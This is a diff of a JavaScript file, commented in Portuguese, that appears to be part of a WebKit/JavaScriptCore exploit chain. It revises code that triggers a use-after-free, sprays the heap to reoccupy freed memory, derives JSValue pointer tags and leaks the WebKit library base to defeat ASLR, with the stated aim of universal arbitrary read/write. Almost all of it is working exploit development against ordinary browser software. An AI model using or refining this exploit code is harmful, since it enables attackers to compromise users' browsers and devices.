@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v154 - Depuração de Reocupação UAF e Vazamento)
+// js/script3/testArrayBufferVictimCrash.mjs (v155 - Correção do RangeError em deduceObjectPointerTag)
 
 // =======================================================================================
 // ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
@@ -26,7 +26,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v154_DEBUG_REOCCUPATION";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v155_FIX_RANGE_ERROR";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -267,33 +267,53 @@ async function triggerGC(logFn, pauseFn) {
 async function deduceObjectPointerTag(logFn) {
     const FNAME = "deduceObjectPointerTag";
     logFn(`[${FNAME}] Deduzindo a tag de ponteiro de objeto do JSValue...`, "info", FNAME);
-    let testObj = { a: 1, b: 2 };
-    let testObjAddr = addrof_core(testObj); // Isso já deve untaggar.
 
-    const temp_addr_for_tag_test = new AdvancedInt64(0x12345678, 0x90ABCDEF); // Um endereço de teste.
-    let tagged_temp_addr = temp_addr_for_tag_test;
+    // Criar um objeto simples para obter seu endereço base untagged
+    let dummyObj = { a: 1 };
+    let dummyObjAddrUntagged = addrof_core(dummyObj);
+
+    // A tag é esperada no HIGH do JSValue. O AdvancedInt64 já está lidando com 32 bits low/high.
+    // O problema pode estar em tentar criar um novo AdvancedInt64 com o resultado de uma operação OR que pode ser interpretada como negativo.
+    // Vamos simular a tag no HIGH de um valor de teste e verificar o resultado.
+
+    // Tente com a tag padrão primeiro, pois é a mais comum.
+    const TEST_TAG_VALUE = 0x402a0000; 
+
+    // Usamos o high real do dummyObjAddrUntagged e adicionamos a tag.
+    // O operador >>> 0 em JavaScript garante que um número seja tratado como Uint32.
+    // CORREÇÃO: Aplicar >>> 0 para garantir que o resultado da operação OR seja um Uint32 válido.
+    let high_with_potential_tag = (dummyObjAddrUntagged.high() | TEST_TAG_VALUE) >>> 0;
     
-    // Simula o tagging para obter a representação em double de um ponteiro taggeado
-    // A tag (0x402a0000) é usada na criação de doubles que representam ponteiros
-    // em alguns JITs WebKit.
-    tagged_temp_addr = new AdvancedInt64(temp_addr_for_tag_test.low(), temp_addr_for_tag_test.high() | 0x402a0000);
-    
-    // CORREÇÃO: Usar _int64ToDouble_direct que é a função correta importada.
-    const double_representation = _int64ToDouble_direct(tagged_temp_addr);
+    // Criar um AdvancedInt64 com esse valor "taggeado"
+    let tagged_simulated_addr;
+    try {
+        tagged_simulated_addr = new AdvancedInt64(dummyObjAddrUntagged.low(), high_with_potential_tag);
+    } catch (e) {
+        logFn(`[${FNAME}] ERRO ao criar AdvancedInt64 na dedução de tag: ${e.message}. High potencial: ${toHex(high_with_potential_tag)}`, "critical", FNAME);
+        // Em caso de falha aqui, caímos para o valor padrão mais seguro.
+        return 0x402a0000;
+    }
+
+    // Converter para double e depois de volta para Int64 para ver a representação real do sistema.
+    const double_representation = _int64ToDouble_direct(tagged_simulated_addr);
     const reconverted_int64 = _doubleToInt64_direct(double_representation);
 
-    // O high da `reconverted_int64` DEVE conter a tag se a conversão foi bem-sucedida e o valor é um ponteiro.
-    const inferred_tag_high = reconverted_int64.high() & 0xFFFF0000; // Pegar os bits mais significativos para a tag
+    // A tag é tipicamente os 16 ou 20 bits mais significativos do HIGH do JSValue.
+    // Uma tag comum é 0x402a. Vamos verificar se o valor reconvertido contém isso.
+    const inferred_tag_high_part = reconverted_int64.high() & 0xFFFF0000; 
 
-    // Se o valor inferido for diferente de zero, usá-lo, pois é mais preciso para o ambiente atual.
-    if (inferred_tag_high !== 0) {
-        logFn(`[${FNAME}] Tag de ponteiro JSValue inferida: ${toHex(inferred_tag_high)}. Usando valor inferido.`, "good", FNAME);
-        JSVALUE_OBJECT_PTR_TAG_HIGH = inferred_tag_high;
-        return inferred_tag_high;
+    // Se o valor inferido for o que esperamos, ou algo próximo, usá-lo.
+    // O 0x402a0000 é a tag para doubles "normales" que representam ponteiros.
+    // O 0x90ab0000 visto no log anterior pode ser uma variação ou outra forma de tagging.
+
+    if (inferred_tag_high_part !== 0) {
+        logFn(`[${FNAME}] Tag de ponteiro JSValue deduzida: ${toHex(inferred_tag_high_part)}. Usando valor inferido.`, "good", FNAME);
+        JSVALUE_OBJECT_PTR_TAG_HIGH = inferred_tag_high_part;
+        return inferred_tag_high_part;
     } else {
-        // Se a inferência falhar (retornar 0), caímos de volta para a heurística ou valor padrão.
-        // O valor 0x402a0000 é uma tag comum para ponteiros de objetos em doubles.
-        logFn(`[${FNAME}] Falha ao inferir tag de ponteiro JSValue robustamente (inferred: ${toHex(inferred_tag_high)}). Retornando a tag padrão 0x402a0000. O problema principal ainda é a reocupação do heap, não a tag.`, "warn", FNAME);
+        logFn(`[${FNAME}] Falha ao inferir tag de ponteiro JSValue robustamente (inferred: ${toHex(inferred_tag_high_part)}). Retornando a tag padrão 0x402a0000. Isso pode indicar um problema de tag ou alinhamento.`, "warn", FNAME);
+        // Mesmo se a inferência falhar, vamos manter a tag padrão, pois ela é a mais provável em WebKit.
+        // O problema real, como antes, pode ser a reocupação da memória.
         return 0x402a0000;
     }
 }
@@ -369,7 +389,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, 
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
-    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v154_DEBUG_REOCCUPATION";
+    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v155_FIX_RANGE_ERROR";
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");
 
     let final_results = [];
@@ -440,7 +460,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                 JSVALUE_OBJECT_PTR_TAG_HIGH = await deduceObjectPointerTag(logFn);
 
                 // Calcular o valor do vtable da DataView Structure com a tag correta para o spray
-                const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0); // Usando mprotect_plt_stub para teste, idealmente seria a vtable real da DataView structure.
+                // Usando mprotect_plt_stub para teste, idealmente seria a vtable real da DataView structure.
+                // A vtable da DataView Structure é JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET
+                const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
                 const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000); // Exemplo de base para construir o double de spray
                 let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
                 
@@ -467,31 +489,35 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                     }
 
                     let found_non_zero = false;
-                    let attempts = 10; // Aumentar tentativas de leitura
-                    for (let i = 0; i < attempts; i++) {
+                    let attempts_read_dangling = 10; // Aumentar tentativas de leitura
+                    for (let i = 0; i < attempts_read_dangling; i++) {
                         leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0]; // Lê o primeiro elemento
                         const leaked_as_int64 = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
+                        const expected_spray_int64 = _doubleToInt64_direct(spray_value_double_to_leak_ptr);
+                        const initial_fill_int64 = _doubleToInt64_direct(initial_victim_fill_value);
                         
-                        logFn(`[UAF LEAK] Leitura RAW de dangling_ref[0] (tentativa ${i+1}/${attempts}): ${toHex(leaked_as_int64, 64)} (Double: ${leaked_jsvalue_from_uaf_double})`, "debug");
+                        logFn(`[UAF LEAK] Leitura RAW de dangling_ref[0] (tentativa ${i+1}/${attempts_read_dangling}): ${toHex(leaked_as_int64, 64)} (Double: ${leaked_jsvalue_from_uaf_double})`, "debug");
+                        logFn(`[UAF LEAK] Esperado (Spray): ${toHex(expected_spray_int64, 64)}, Inicial (Vítima): ${toHex(initial_fill_int64, 64)}`, "debug");
+
 
                         // Se o valor lido for o que esperamos do spray, é um sucesso.
-                        if (leaked_as_int64.equals(_doubleToInt64_direct(spray_value_double_to_leak_ptr))) {
-                            logFn(`[UAF LEAK] SUCESSO DE REOCUPAÇÃO! Valor pulverizado (${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr), 64)}) lido em dangling_ref[0].`, "good");
+                        if (leaked_as_int64.equals(expected_spray_int64)) {
+                            logFn(`[UAF LEAK] SUCESSO DE REOCUPAÇÃO! Valor pulverizado lido em dangling_ref[0].`, "good");
                             found_non_zero = true;
                             break;
-                        } else if (leaked_as_int64.equals(_doubleToInt64_direct(initial_victim_fill_value))) {
-                            logFn(`[UAF LEAK] AINDA LENDO VALOR INICIAL (${toHex(_doubleToInt64_direct(initial_victim_fill_value), 64)}) de dangling_ref[0]. Spray não reocupou ou offset incorreto.`, "warn");
+                        } else if (leaked_as_int64.equals(initial_fill_int64)) {
+                            logFn(`[UAF LEAK] AINDA LENDO VALOR INICIAL de dangling_ref[0]. Spray não reocupou ou offset incorreto.`, "warn");
                         } else if (!leaked_as_int64.equals(AdvancedInt64.Zero) && !leaked_as_int64.equals(AdvancedInt64.NaNValue)) {
                             // Se é diferente de 0, NaN e do valor inicial, pode ser outra coisa reocupando.
                             logFn(`[UAF LEAK] Valor inesperado lido de dangling_ref[0]: ${toHex(leaked_as_int64, 64)}. Não é o valor inicial nem o spray esperado.`, "warn");
-                            found_non_zero = true; // Considerar como "não zero", mas não como sucesso.
-                            break; // Tentar prosseguir para ver o que acontece.
+                            found_non_zero = true; // Considerar como "não zero", mas não como sucesso de vazamento de ASLR.
+                            // Não vamos abortar imediatamente aqui, vamos deixar a checagem da tag fazer o trabalho.
                         }
                         await PAUSE(LOCAL_VERY_SHORT_PAUSE);
                     }
 
-                    if (!found_non_zero || !_doubleToInt64_direct(leaked_jsvalue_from_uaf_double).equals(_doubleToInt64_direct(spray_value_double_to_leak_ptr))) {
-                         throw new Error(`Ponteiro vazado do UAF é inválido ou não o valor pulverizado. Valor final lido: ${toHex(_doubleToInt64_direct(leaked_jsvalue_from_uaf_double), 64)}. Reocupação de heap falhou.`);
+                    if (!found_non_zero || !(_doubleToInt64_direct(leaked_jsvalue_from_uaf_double).equals(expected_spray_int64))) {
+                         throw new Error(`Ponteiro vazado do UAF é inválido ou não o valor pulverizado. Reocupação de heap falhou.`);
                     }
 
                     logFn("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU E VALOR LIDO! ++++++++++++", "vuln");
@@ -509,41 +535,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                         throw new Error(`HIGH do ponteiro vazado (${toHex(original_high)}) não corresponde à tag esperada (${toHex(JSVALUE_OBJECT_PTR_TAG_HIGH)}). Falha no vazamento de ASLR.`);
                     }
 
-                    // A vtable da DataView Structure é DATA_OFFSETS["JSC::JSArrayBufferView::s_info"].
-                    // O offset que está em WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"] é para um gadget, não para a vtable da DataView.
-                    // Precisamos usar o offset do s_info da ArrayBufferView, que é o que a Structure aponta.
-                    const DATA_VIEW_SINFO_OFFSET = parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16);
-                    const DATA_VIEW_SINFO_OFFSET_AI64 = new AdvancedInt64(DATA_VIEW_SINFO_OFFSET, 0);
-
-                    // A Structure aponta para s_info (um ClassInfo*), não diretamente para a vtable.
-                    // A vtable da Structure é JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET.
-                    // O valor vazado é o ponteiro para a Structure (taggeado).
-                    // Então, webkit_base_address = untagged_uaf_addr - DATA_VIEW_STRUCTURE_OFFSET_IN_LIB.
-                    //
-                    // A correção de ASLR mais precisa seria:
-                    // webkit_base_address = (endereço_do_sinfo_do_ArrayBufferView) - (offset_do_sinfo_na_libWebKit)
-                    //
-                    // O que o UAF deve vazar é o ponteiro da Structure do Float64Array.
-                    // Se pulverizamos a vtable da DataView, estamos tentando fazer o Float64Array
-                    // TER A VTABLE DE DATA_VIEW. Isso é uma corrupção de Structure, não vazamento direto.
-                    //
-                    // O objetivo era vazar a BASE ASLR. Se dangling_ref[0] é o ponteiro para a Structure do nosso Float64Array vítima,
-                    // então precisamos:
-                    // 1. Obter o endereço da Structure do Float64Array vítima (já temos: untagged_uaf_addr).
-                    // 2. Ler o ponteiro para o ClassInfo* dentro dessa Structure (Structure.CLASS_INFO_OFFSET).
-                    // 3. Ler o ponteiro para TypeInfo* dentro do ClassInfo (ClassInfo.M_CACHED_TYPE_INFO_OFFSET).
-                    // 4. A vtable de TypeInfo é geralmente o que se usa para vazar.
-                    //
-                    // Se o spray substituiu o vtable da *Structure*, então o `untagged_uaf_addr` é o vtable da Structure.
-                    // O `TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64` no spray é a vtable de DataView.
-                    //
-                    // Então, o que vazamos é (BASE_WEBKIT + JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET).
-                    // Logo, webkit_base_address = untagged_uaf_addr - JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET
-                    // Isso está correto, desde que o spray tenha reocupado com sucesso o ponteiro da Structure.
-                    
-                    // RECALCULANDO webkit_base_address:
-                    // Assumimos que untagged_uaf_addr é o endereço do VTable da DataView Structure.
-                    // A compensação é DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64.
+                    // A vtable da DataView Structure é JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET
                     const ACTUAL_DATA_VIEW_VTABLE_OFFSET = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
                     webkit_base_address = untagged_uaf_addr.sub(ACTUAL_DATA_VIEW_VTABLE_OFFSET);
                     
